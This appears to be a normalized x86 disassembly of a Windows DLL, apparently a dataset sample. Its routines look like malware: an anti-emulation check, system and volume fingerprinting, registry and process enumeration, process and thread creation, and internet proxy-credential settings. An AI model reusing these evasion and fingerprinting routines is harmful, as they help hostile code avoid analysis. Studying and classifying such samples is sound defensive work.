call [ wsprintfA@IAT ]
add esp 0x14
push [ ebp + 0x8 ]
xor eax eax
push [ ebp - 0xc ]
push eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x10 ]
push eax
call [ CreateProcessA@IAT ]
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp + 0xc ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp + 0xc ]
push ebx
push 0x1
push 0x9
push edi
call [ eax ]
push [ ebp - 0x14 ]
call sub_100049d3
push [ ebp - 0x10 ]
call sub_100049d3
pop ecx
pop ecx
push [ ebp + 0x8 ]
call sub_100049b2
push [ ebp - 0xc ]
call sub_100049b2
pop ecx
pop ecx
mov eax [ ebp - 0x18 ]
add eax 0x11
push eax
call sub_100049a9
push 0x10
push [ ebp + 0x8 ]
mov [ ebp + 0xc ] eax
push eax
call sub_1000428b
push [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
push [ ebp - 0x4 ]
add eax 0x10
push eax
call sub_1000428b
add esp 0x1c
xor eax eax
push eax
push eax
push [ ebp + 0xc ]
push sub_1000430d
push eax
push eax
call [ CreateThread@IAT ]
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp + 0xc ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp + 0xc ]
push ebx
push 0x1
push 0xa
push edi
call [ eax ]
sub_100046e7
push esi
mov esi ecx
push edi
mov edi [ esi ]
test edi edi
je r-xdata
push [ esi + 0x8 ]
call sub_100049d3
pop ecx
pop edi
mov [ esi + 0x10 ] 0x0
pop esi
retn
mov ecx edi
call sub_1000416b
push edi
call sub_100049b2
pop ecx
sub_1000471a
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
mov esi [ Sleep@IAT ]
push edi
push 0x0
call esi
lea eax [ ebp - 0xc ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edi [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0x5
mov ebx r--data
push ebx
call [ eax ]
push 0x0
call esi
lea eax [ ebp - 0x14 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0x6
push ebx
call [ eax ]
mov edi [ ebp - 0xc ]
mov ebx [ ebp - 0x14 ]
xor edi [ ebp - 0x8 ]
xor ebx [ ebp - 0x10 ]
push 0x0
call esi
call [ GetTickCount@IAT ]
xor eax ebx
xor eax edi
pop edi
pop esi
pop ebx
leave
retn
sub_100047b3
push esi
push 0x3e
mov esi ecx
call sub_100049a9
mov [ esi ] eax
pop ecx
mov al 0x30
mov edx [ esi ]
lea ecx [ eax - 0x30 ]
movsx ecx cl
mov [ ecx + edx ] al
inc al
cmp al 0x3a
jl r-xdata
mov al 0x41
mov edx [ esi ]
lea ecx [ eax - 0x37 ]
movsx ecx cl
mov [ ecx + edx ] al
inc al
cmp al 0x5b
jl r-xdata
mov al 0x61
mov edx [ esi ]
lea ecx [ eax - 0x3d ]
movsx ecx cl
mov [ ecx + edx ] al
inc al
cmp al 0x7b
jl r-xdata
pop esi
retn
sub_10004823
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
lea eax [ esi + 0x1 ]
push edi
push eax
mov ebx ecx
call sub_100049a9
xor edi edi
pop ecx
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn 0x4
mov ecx ebx
call sub_1000471a
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov esi [ eax ]
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x4
push r--data
call [ esi ]
mov eax [ ebp - 0x8 ]
xor edx edx
push 0x3e
pop ecx
div ecx
mov eax [ ebx ]
mov ecx [ ebp - 0x4 ]
mov al [ edx + eax ]
mov [ edi + ecx ] al
inc edi
cmp edi [ ebp + 0x8 ]
jb r-xdata
sub_10004896
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
push [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
push 0x1
call sub_10004807
mov esi [ GetLastError@IAT ]
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp + 0xc ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp + 0xc ]
mov ebx r--data
push ebx
push 0x1
push 0x1
mov edi r--data
push edi
call [ eax ]
mov eax [ ebp + 0x8 ]
inc eax
imul eax [ ebp - 0x8 ]
inc eax
push eax
call sub_100049a9
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
leave
retn 0x8
mov [ ebp - 0x10 ] eax
push [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
push 0x1
call sub_10004807
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp + 0xc ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp + 0xc ]
push ebx
push 0x1
push 0x2
push edi
call [ eax ]
push [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
call sub_10004823
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp + 0xc ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp + 0xc ]
push ebx
push 0x1
push 0x3
push edi
call [ eax ]
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x14 ]
push r--data
push eax
call [ wsprintfA@IAT ]
push [ ebp - 0x8 ]
add [ ebp - 0x4 ] eax
call sub_100049d3
add esp 0x10
dec [ ebp - 0x10 ]
jne r-xdata
sub_100049b2
push ebp
mov ebp esp
call [ GetProcessHeap@IAT ]
test eax eax
je r-xdata
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push [ ebp + 0x8 ]
push 0x0
push eax
call [ HeapFree@IAT ]
sub_100049dc
push ebp
mov ebp esp
sub esp 0x11c
push esi
push edi
xor esi esi
xor eax eax
push 0xfe
mov [ ebp - 0x108 ] ax
lea eax [ ebp - 0x106 ]
push esi
push eax
mov [ ebp - 0x11c ] 0x11c
mov [ ebp - 0x118 ] esi
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x110 ] esi
mov [ ebp - 0x10c ] esi
call sub_100042df
add esp 0xc
push 0x3
push 0x20
push 0x3
push 0x1
push 0x3
push 0x2
xor eax eax
push esi
push esi
mov esi [ VerSetConditionMask@IAT ]
mov [ ebp - 0x8 ] ax
mov [ ebp - 0x6 ] ax
lea edi [ ebp - 0x4 ]
stosd [ edi ]
call esi
push edx
push eax
call esi
push edx
push eax
call esi
movzx ecx [ ebp + 0x8 ]
mov [ ebp - 0x118 ] ecx
movzx ecx [ ebp + 0xc ]
push edx
push eax
mov [ ebp - 0x114 ] ecx
mov cx [ ebp + 0x10 ]
push 0x23
lea eax [ ebp - 0x11c ]
push eax
mov [ ebp - 0x8 ] cx
call [ VerifyVersionInfoW@IAT ]
neg eax
sbb eax eax
pop edi
neg eax
pop esi
leave
retn
sub_10004a8c
push ebp
mov ebp esp
push ecx
fwait
fninit
push 0x1e240
push 0x0
fild [ esp ]
movq [ esp ] mm7
pop eax
pop eax
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0xf1200000
setne al
leave
retn
sub_10004ab2
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea eax [ ebp - 0x4 ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call [ IsWow64Process@IAT ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0xa
push r--data
call [ esi ]
cmp [ ebp - 0x4 ] 0x0
pop esi
sete al
dec al
and al 0x20
add al 0x20
leave
retn
sub_10004b00
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
push edi
mov edi 0x9c
push edi
call sub_10004992
mov esi eax
pop ecx
push esi
mov [ esi ] edi
call [ GetVersionExA@IAT ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edi [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0xb
mov ebx r--data
push ebx
call [ eax ]
lea eax [ ebp - 0x28 ]
push eax
call [ GetSystemInfo@IAT ]
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0xc
push ebx
call [ eax ]
mov eax [ esi + 0x4 ]
xor ebx ebx
cmp eax 0x5
jne r-xdata
cmp eax 0x6
jne r-xdata
mov eax [ esi + 0x8 ]
sub eax ebx
je r-xdata
push esi
call sub_100049b2
pop ecx
pop edi
pop esi
mov al bl
pop ebx
leave
retn
cmp [ esi + 0x9a ] 0x1
mov eax [ esi + 0x8 ]
jne r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
sub eax ebx
je r-xdata
sub eax ebx
je r-xdata
mov bl 0x2
jmp r-xdata
dec eax
jne r-xdata
mov bl 0xb
dec eax
je r-xdata
mov bl 0x7
jmp r-xdata
dec eax
je r-xdata
cmp [ esi + 0x9a ] 0x1
jne r-xdata
mov bl 0xc
jmp r-xdata
dec eax
je r-xdata
mov bl 0x8
jmp r-xdata
dec eax
je r-xdata
mov eax 0x8000
test [ esi + 0x98 ] ax
je r-xdata
cmp [ ebp - 0x28 ] 0x9
jne r-xdata
mov bl 0xd
jmp r-xdata
dec eax
jne r-xdata
push ebx
push 0x3
push 0x6
call sub_100049dc
add esp 0xc
test al al
setne bl
add bl 0x9
jmp r-xdata
dec eax
jne r-xdata
mov edi [ GetSystemMetrics@IAT ]
push 0x59
call edi
test eax eax
jne r-xdata
mov bl 0x4
jmp r-xdata
mov bl 0x3
jmp r-xdata
mov bl 0xe
jmp r-xdata
mov bl 0xa
jmp r-xdata
push 0x59
call edi
test eax eax
je r-xdata
mov bl 0x5
jmp r-xdata
mov bl 0x6
jmp r-xdata
sub_10004c50
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
lea eax [ ebp - 0x4 ]
push eax
mov esi r--data
push esi
push 0x0
call ObtainUserAgentString
mov eax [ rw-data ]
mov eax [ eax ]
mov edi [ GetLastError@IAT ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0xd
mov ebx r--data
push ebx
call [ eax ]
push [ ebp - 0x4 ]
call sub_100049a9
pop ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
push 0x0
mov [ ebp - 0xc ] eax
call ObtainUserAgentString
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0xe
push ebx
call [ eax ]
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
leave
retn
sub_10004cd5
push ebp
mov ebp esp
push ecx
push esi
xor eax eax
push eax
push eax
push eax
push eax
lea ecx [ ebp - 0x4 ]
push ecx
push eax
push eax
push eax
mov [ ebp - 0x4 ] eax
call [ GetVolumeInformationA@IAT ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0xf
push r--data
call [ esi ]
mov eax [ ebp - 0x4 ]
pop esi
leave
retn
sub_10004d1a
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
push 0xc
call sub_10004992
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
xor esi esi
mov ecx eax
call sub_10003e0c
mov esi eax
jmp r-xdata
mov esi [ RegQueryValueExA@IAT ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
push ebx
mov edi r--data
push edi
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x8 ]
call sub_100049a9
pop ecx
lea ecx [ ebp - 0x8 ]
push ecx
push eax
push ebx
push ebx
push edi
push [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
call esi
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
leave
retn
mov ecx esi
call sub_1000416b
push esi
call sub_100049b2
pop ecx
push 0x2f
push r--data
mov ecx esi
call sub_1000411b
mov edi eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push ebx
push edi
push 0x80000002
call [ RegOpenKeyExA@IAT ]
push edi
call sub_100049d3
pop ecx
cmp esi ebx
je r-xdata
sub_10004dbc
push ebp
mov ebp esp
sub esp 0x138
push esi
call sub_10004a8c
test al al
je r-xdata
push 0xc
call sub_10004992
pop ecx
test eax eax
je r-xdata
mov eax [ rw-data ]
mov esi [ eax ]
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x1
push r--data
call [ esi ]
xor eax eax
jmp r-xdata
and [ ebp - 0x8 ] 0x0
mov ecx eax
call sub_10003e0c
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop esi
leave
retn
push 0x0
push 0x2
call [ ebp - 0x10 ]
lea ecx [ ebp - 0x138 ]
push ecx
push eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x138 ] 0x128
call Process32First
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x5
push edi
call [ eax ]
and [ ebp - 0x8 ] 0x0
call sub_1000416b
push [ ebp - 0x8 ]
call sub_100049b2
pop ecx
mov ecx [ ebp - 0x8 ]
push ebx
push edi
push 0x18
push r--data
call sub_1000411b
mov esi [ GetLastError@IAT ]
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov ebx r--data
push ebx
push 0x1
push 0x2
mov edi r--data
push edi
call [ eax ]
push r--data
call [ GetModuleHandleA@IAT ]
push [ ebp - 0xc ]
push eax
call [ GetProcAddress@IAT ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x3
push edi
call [ eax ]
push [ ebp - 0xc ]
call sub_100049d3
pop ecx
mov ecx [ ebp - 0x8 ]
test ecx ecx
je r-xdata
lea eax [ ebp - 0x114 ]
push eax
call [ lstrlenA@IAT ]
mov ecx [ ebp - 0x8 ]
lea eax [ ecx + eax + 0x1 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x138 ]
push eax
push [ ebp - 0xc ]
call Process32Next
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x6
push edi
call [ eax ]
mov eax [ ebp - 0x8 ]
inc eax
push eax
call sub_100049a9
and [ ebp - 0x8 ] 0x0
pop ecx
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x138 ]
push eax
push [ ebp - 0xc ]
call Process32First
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x7
push edi
call [ eax ]
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x10 ]
add eax [ ebp - 0x8 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add [ ebp - 0x8 ] eax
add esp 0xc
lea eax [ ebp - 0x138 ]
push eax
push [ ebp - 0xc ]
call Process32Next
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x8
push edi
call [ eax ]
push [ ebp - 0xc ]
call [ CloseHandle@IAT ]
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x9
push edi
call [ eax ]
mov eax [ ebp - 0x10 ]
pop edi
pop ebx
sub_10004ff5
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebp
retn 0x4
push eax
call sub_100049d3
pop ecx
sub_10005014
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
pop esi
pop ebp
retn 0x4
push eax
call sub_100049d3
pop ecx
sub_10005033
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi + 0xc ] eax
pop esi
pop ebp
retn 0x4
push eax
call sub_100049d3
pop ecx
sub_1000505e
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
test eax eax
je r-xdata
push eax
call sub_100049d3
pop ecx
mov eax [ esi + 0x8 ]
and [ esi + 0xc ] 0x0
test eax eax
je r-xdata
push eax
call sub_100049d3
pop ecx
and [ esi + 0x8 ] 0x0
mov eax esi
pop esi
retn
push eax
call sub_100049d3
pop ecx
sub_100050a1
push esi
push 0xc
mov esi ecx
call sub_10004992
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_10003e0c
jmp r-xdata
xor eax eax
mov ecx eax
call sub_10003ce6
jmp r-xdata
push 0x1
mov [ esi + 0x4 ] eax
call sub_10004992
pop ecx
test eax eax
je r-xdata
and [ esi + 0x10 ] 0x0
and [ esi + 0x8 ] 0x0
and [ esi + 0xc ] 0x0
push 0x28
mov [ esi ] eax
call sub_100049a9
mov [ esi + 0x1c ] eax
pop ecx
mov eax esi
pop esi
retn
sub_100050f2
push ebp
mov ebp esp
mov eax [ ecx + 0x1c ]
xor edx edx
mov ecx eax
mov ecx [ ebp + 0x8 ]
mov [ eax + edx * 4 ] ecx
inc edx
add ecx 0x4
cmp edx 0xa
jl r-xdata
cmp [ ecx ] 0x0
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
push esi
mov esi [ eax ]
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x6
push r--data
call [ esi ]
pop esi
pop ebp
retn 0x4
sub_1000513c
push esi
mov esi ecx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
push 0x2c
push r--data
call sub_1000411b
mov [ esi + 0xc ] eax
mov eax [ rw-data ]
mov esi [ eax ]
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x7
push r--data
call [ esi ]
pop esi
retn
push eax
call sub_100049d3
pop ecx
sub_10005185
push ebp
mov ebp esp
sub esp 0x1c
and [ ebp - 0x18 ] 0x0
and [ ebp - 0x14 ] 0x0
push ebx
push esi
mov esi [ GetLastError@IAT ]
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x10 ] r--data
mov ebx r--data
mov edi r--data
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
push eax
call sub_100049d3
mov eax [ ebp - 0x8 ]
and [ eax + 0xc ] 0x0
mov eax [ rw-data ]
mov eax [ eax ]
pop ecx
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x8
push edi
call [ eax ]
add [ ebp - 0x14 ] 0x2c
inc [ ebp - 0x18 ]
add [ ebp - 0x10 ] 0x2c
cmp [ ebp - 0x14 ] 0x84
jb r-xdata
push [ ebp - 0xc ]
call sub_100049d3
mov eax [ rw-data ]
mov eax [ eax ]
pop ecx
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0xc
push edi
call [ eax ]
mov eax [ ebp - 0x18 ]
push 0x2c
cmp eax 0x2
jne r-xdata
push [ ebp - 0xc ]
call sub_100049d3
mov eax [ rw-data ]
mov eax [ eax ]
pop ecx
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x9
push edi
call [ eax ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x4 ]
push 0x2c
push [ ebp - 0x10 ]
call sub_1000411b
push eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
push [ eax + 0xc ]
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
jmp r-xdata
push 0x3
xor edx edx
pop ecx
inc eax
div ecx
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x4 ]
imul edx edx 0x2c
add edx r--data
push edx
call sub_1000411b
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0xb
push edi
call [ eax ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x4 ]
push r--data
call sub_1000411b
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0xa
push edi
call [ eax ]
and [ ebp - 0x1c ] 0x0
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0xd
push edi
call [ eax ]
mov eax [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
leave
retn
sub_1000532f
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx ecx
mov ecx [ ebx + 0x4 ]
push 0x2
push r--data
call sub_1000411b
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov esi [ eax ]
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x28
push r--data
call [ esi ]
mov esi [ lstrlenA@IAT ]
push r--data
call esi
push [ ebp - 0x4 ]
mov edi eax
imul edi edi 0x3
call esi
push [ ebp + 0x8 ]
add edi eax
call esi
push [ ebp + 0xc ]
add edi eax
call esi
lea eax [ eax + edi + 0x5 ]
push eax
call sub_100049a9
mov esi eax
pop ecx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
push [ ebp - 0x4 ]
push r--data
push esi
call [ wsprintfA@IAT ]
mov edi eax
push 0x4
lea eax [ ebx + 0x10 ]
push eax
lea eax [ edi + esi ]
push eax
call sub_1000428b
push [ ebp + 0xc ]
add edi 0x4
push [ ebp + 0x8 ]
lea eax [ edi + esi ]
push r--data
push eax
call [ wsprintfA@IAT ]
mov ecx [ ebx + 0x4 ]
add esp 0x28
push 0x1
add edi eax
push edi
push esi
call sub_10003e60
mov ebx eax
mov eax [ rw-data ]
mov edi [ eax ]
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x29
push r--data
call [ edi ]
push esi
call sub_100049d3
push [ ebp - 0x4 ]
call sub_100049d3
pop ecx
pop ecx
mov eax ebx
sub_10005430
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ lstrlenA@IAT ]
push edi
push [ ebp + 0xc ]
call esi
push [ ebp + 0x10 ]
lea edi [ eax + 0x1 ]
call esi
mov esi [ InternetSetOptionA@IAT ]
push edi
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push 0x2b
push [ ebp + 0x8 ]
call esi
mov eax [ rw-data ]
mov eax [ eax ]
mov edi [ GetLastError@IAT ]
mov [ ebp + 0xc ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp + 0xc ]
push r--data
push 0x1
push 0x3c
mov ebx r--data
push ebx
call [ eax ]
mov eax [ ebp - 0x4 ]
inc eax
push eax
push [ ebp + 0x10 ]
push 0x2c
push [ ebp + 0x8 ]
call esi
mov [ ebp + 0xc ] eax
mov eax [ rw-data ]
mov esi [ eax ]
call edi
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x3d
push ebx
call [ esi ]
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
leave
retn 0xc
sub_100054c3
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x1 ] 0x0
xor edi edi
mov eax [ rw-data ]
mov esi [ eax ]
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x3e
push r--data
call [ esi ]
jmp r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax ]
test al al
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
mov edi [ eax ]
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x3f
push r--data
call [ edi ]
mov [ ebx + 0x20 ] esi
mov [ ebp - 0x1 ] 0x1
add edi 0x4
cmp edi 0x28
jl r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ edi + eax ]
test esi esi
je r-xdata
jmp r-xdata
sub_10005549
push esi
push edi
mov edi ecx
xor esi esi
mov eax [ rw-data ]
mov esi [ eax ]
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x3e
push r--data
call [ esi ]
mov eax [ ecx ]
call [ eax + 0x1c ]
add esi 0x4
cmp esi 0x28
jl r-xdata
mov eax [ edi + 0x1c ]
mov ecx [ esi + eax ]
test ecx ecx
je r-xdata
jmp r-xdata
pop edi
xor al al
pop esi
retn
sub_10005591
push edi
mov edi ecx
cmp [ edi + 0x20 ] 0x0
je r-xdata
xor eax eax
pop edi
retn
mov eax [ rw-data ]
push esi
mov esi [ eax ]
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x40
push r--data
call [ esi ]
mov ecx [ edi + 0x20 ]
mov eax [ ecx ]
pop esi
pop edi
jmp [ eax + 0x4 ]
sub_100055cd
push edi
mov edi ecx
cmp [ edi + 0x20 ] 0x0
je r-xdata
xor eax eax
pop edi
retn
mov eax [ rw-data ]
push esi
mov esi [ eax ]
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x41
push r--data
call [ esi ]
mov ecx [ edi + 0x20 ]
mov eax [ ecx ]
pop esi
pop edi
jmp [ eax + 0x8 ]
sub_10005609
push edi
mov edi ecx
cmp [ edi + 0x20 ] 0x0
je r-xdata
xor eax eax
pop edi
retn
mov eax [ rw-data ]
push esi
mov esi [ eax ]
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x42
push r--data
call [ esi ]
mov ecx [ edi + 0x20 ]
mov eax [ ecx ]
pop esi
pop edi
jmp [ eax + 0xc ]
sub_10005645
push esi
mov esi ecx
mov eax [ esi + 0xc ]
push edi
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call sub_100049d3
pop ecx
mov edi [ esi ]
test edi edi
je r-xdata
push eax
call sub_100049d3
pop ecx
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
mov ecx edi
call sub_10003ce9
push edi
call sub_100049b2
pop ecx
xor edi edi
mov ecx edi
call sub_1000416b
push edi
call sub_100049b2
pop ecx
add edi 0x4
cmp edi 0x28
jl r-xdata
push [ eax + edi ]
call sub_100049b2
pop ecx
mov eax [ esi + 0x1c ]
cmp [ eax + edi ] 0x0
je r-xdata
push [ esi + 0x1c ]
call sub_100049b2
pop ecx
pop edi
pop esi
retn
sub_100056b6
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
mov esi ecx
mov ecx [ esi ]
push edi
mov [ ebp - 0x8 ] esi
call sub_10004cd5
mov ecx [ esi ]
mov [ esi + 0x10 ] eax
call sub_10004c50
push 0x10
mov [ esi + 0x8 ] eax
call sub_10004992
pop ecx
test eax eax
je r-xdata
and [ ebp - 0xc ] 0x0
mov ecx eax
call sub_1000505e
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov ebx r--data
